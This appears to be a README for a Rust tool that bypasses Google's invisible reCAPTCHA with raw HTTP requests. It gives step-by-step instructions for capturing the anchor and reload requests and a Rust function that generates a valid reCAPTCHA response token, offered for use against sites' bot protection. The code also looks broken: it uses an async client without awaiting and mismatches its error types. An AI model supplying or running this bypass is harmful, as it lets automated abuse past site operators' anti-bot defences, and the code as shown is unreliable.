# Bypass Invisible Recaptcha Rust Port v2 / v3

Allows to bypass an invisible recaptcha just with **HTTP requests**, without **headless chrome** or **OCR**.

## Important

1 - This bypass does not work on all invisible recaptchas, **you have to try it** to know if it works on your recaptcha;

2 - This bypass only works on **invisible recaptchas**.

3 - You must have **some knowledge** of HTTP requests to understand

## EXPLOIT

### STEP 1

Inspect network to find the **recaptcha anchor url**.

![ ](https://i.ibb.co/fFprvrH/anchor.png)

### STEP 2

Inspect network to find the **recaptcha reload url**.

![ ](https://i.ibb.co/1J3gxYY/reload.png)

### STEP 3

Let's now look at the **payload** of the reload request

1 - Find **CHR** [xx, xx, xx] **(2023 : no longer required, you can leave it blank in the script)**

![ ](https://i.ibb.co/sjmFYCc/chr.png)

2 - Find **VH** (The **number sequence** after the character *) **(2023 : no longer required, you can leave it blank in the script)**

![ ](https://i.ibb.co/HrchVCB/vh.png)

3 - Find **BG** (Not me :D, the other BG inside the payload **from the character** ! **to the character** *) **(2023 : no longer required, you can leave it blank in the script)**

Starts here

![ ](https://i.ibb.co/nDTFfsY/bg1.png)

Ends here

![ ](https://i.ibb.co/BwMRhPt/bg2.png)

### STEP 4

Run **cargo run --release** with Rust and fill inputs.

![ ](https://i.ibb.co/MB3nDMN/inputs.png)

Recaptcha is **vulnerable** :D we can generate the **recaptcha response** with HTTP requests !

![ ](https://i.ibb.co/3WCj0XC/bypass.png)

### STEP 5

Go in the **bypassed.txt** file, take the **variables** and you can now create your script to generate the **recaptcha response**.

## Generate Recaptcha Response

```rust
use reqwest::Client;

async fn generate_response(anchor_url: &str, reload_url: &str, payload: &str) -> anyhow::Result<String> {
    let client = Client::new();
    
    let anchor_resp = client.get(anchor_url).send()?.text()?;
    let token1 = anchor_resp.split("recaptcha-token\" value=\"").nth(1).ok_or("Token not found")?.split("\">").next().ok_or("Token not found")?;
    
    let payload = form_urlencoded::Serializer::new(String::new())
        .append_pair("token", token1)
        .finish();
    
    let reload_resp = client.post(reload_url)
        .body(payload)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .send()?
        .text()?;
    
    if let Some(token2) = reload_resp.split("\"rresp\",\"").nth(1).and_then(|s| s.split("\"").next()) {
        Ok(token2.to_string())
    } else {
        Err("Response token not found".into())
    }
}
```

**2023 update : You can just send the token retrieved using the GET request to the anchor url and it will still work.**

## Contributing

Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## Credits

blank <3 (Original)
waki285 <3 (Rust port)
